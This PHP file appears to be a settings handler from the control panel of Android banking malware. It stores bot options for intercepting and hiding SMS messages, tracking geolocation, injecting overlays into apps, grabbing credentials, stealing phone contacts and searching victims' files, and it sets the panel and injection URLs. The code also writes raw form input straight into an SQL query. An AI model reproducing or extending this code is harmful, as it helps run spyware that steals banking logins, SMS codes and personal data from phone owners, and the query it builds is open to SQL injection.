<?php
session_start();
$statusCode=false;
if (!(isset($_SESSION['panel_user']))){
	session_destroy();
	header("Location: /index.php");
}else{
	if ($_SESSION['panel_status']!="Action"){
		session_destroy();
		header("Location: /index.php");
	}else{
		$statusCode=true;
	}
}
	 //передаем данные для выпонения команд!!!-----
		if((isset($_POST["SAVESETTINGS"]))&&($statusCode))
		{
			include '../../config.php';

			$urls = isset($_POST['adminkaurl']) ? $_POST['adminkaurl'] : "";

			$urlInj = isset($_POST['injurl']) ? $_POST['injurl'] : "";

			$intInterval = isset($_POST['intInterval']) ? $_POST['intInterval'] : "";

			$checksms =  isset($_POST['checksms']) ? $_POST['checksms'] : "";

			$checkhidesms = isset($_POST['checkhidesms']) ? $_POST['checkhidesms'] : "";

			$checkgeolocation = isset($_POST['checkgeolocation']) ? $_POST['checkgeolocation'] : "";

			$checkInjectionsApps = isset($_POST['checkInjectionsApps']) ? $_POST['checkInjectionsApps'] : "";
			$secondInjectionsApps = isset($_POST['secondInjectionsApps']) ? $_POST['secondInjectionsApps'] : "";

			$checkRequestGeolocation =  isset($_POST['checkRequestGeolocation']) ? $_POST['checkRequestGeolocation'] : "";
			$secondRequestGeolocation =  isset($_POST['secondRequestGeolocation']) ? $_POST['secondRequestGeolocation'] : "";

			$findfiles =  isset($_POST['findfiles']) ? $_POST['findfiles'] : "";

			$checkGrab_auto = $_POST['checkGrab_auto'];
			$Grab_auto = "";
			if($checkGrab_auto=="1")
			{
				if (preg_match("/check_set/",print_r($_POST,true)))
				{
					foreach($_POST["check_set"] as $ch)
					{
						$Grab_auto="$Grab_auto|$ch";
					}
				}
			}
			$secondGrab_auto = $_POST['secondGrab_auto'];

			$checkInjGrab = $_POST['checkInjGrab'];
			$InjGrab = "";
			if($checkInjGrab=="1")
			{
				if (preg_match("/check2_set/",print_r($_POST,true)))
				{
					foreach($_POST["check2_set"] as $ch)
					{
						$InjGrab="$InjGrab|$ch";
					}
				}
			}
			$secondInjGrab = $_POST['secondInjGrab'];

			$checkPhoneContacts = isset($_POST['checkPhoneContacts']) ? $_POST['checkPhoneContacts'] : "";
			$secondPhoneContacts = isset($_POST['secondPhoneContacts']) ? $_POST['secondPhoneContacts'] : "";
			$checkStartGeolocation = isset($_POST['checkStartGeolocation']) ? $_POST['checkStartGeolocation'] : "";
			$secondStartGeolocation =isset($_POST['secondStartGeolocation']) ? $_POST['secondStartGeolocation'] : "";

		//echo "$login|$password|$right";

		$connect = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connect->exec('SET NAMES utf8');

		$generateHash=generateHash(15);

		$urls = $_POST['adminkaurl'];

			$urlInj = $_POST['injurl'];

		$sql = "UPDATE settingsall SET hash='$generateHash', intInterval='$intInterval', checksms='$checksms', checkhidesms='$checkhidesms', checkgeolocation='$checkgeolocation',
		checkInjectionsApps='$checkInjectionsApps', secondInjectionsApps='$secondInjectionsApps',
		checkRequestGeolocation='$checkRequestGeolocation',secondRequestGeolocation='$secondRequestGeolocation',
		checkGrab_auto='$checkGrab_auto',Grab_auto='$Grab_auto',secondGrab_auto='$secondGrab_auto',checkInjGrab='$checkInjGrab',
		InjGrab='$InjGrab',secondInjGrab='$secondInjGrab',checkPhoneContacts='$checkPhoneContacts',secondPhoneContacts='$secondPhoneContacts',
		checkStartGeolocation='$checkStartGeolocation',secondStartGeolocation='$secondStartGeolocation',urls='$urls', urlInj='$urlInj', findfiles='$findfiles'
		WHERE id='1';";
		$connect->query($sql);

		header("Location: /".namefolder."/index.php?cont=settings&page=bots-settings");
		}
function generateHash($length){
$chars = 'abdefhiknrstyzABDEFGHKNQRSTYZ23456789';
$numChars = strlen($chars);
$string = '';
	for ($i = 0; $i < $length; $i++) {
	$string .= substr($chars, rand(1, $numChars) - 1, 1);
	}
return $string;
}
?>
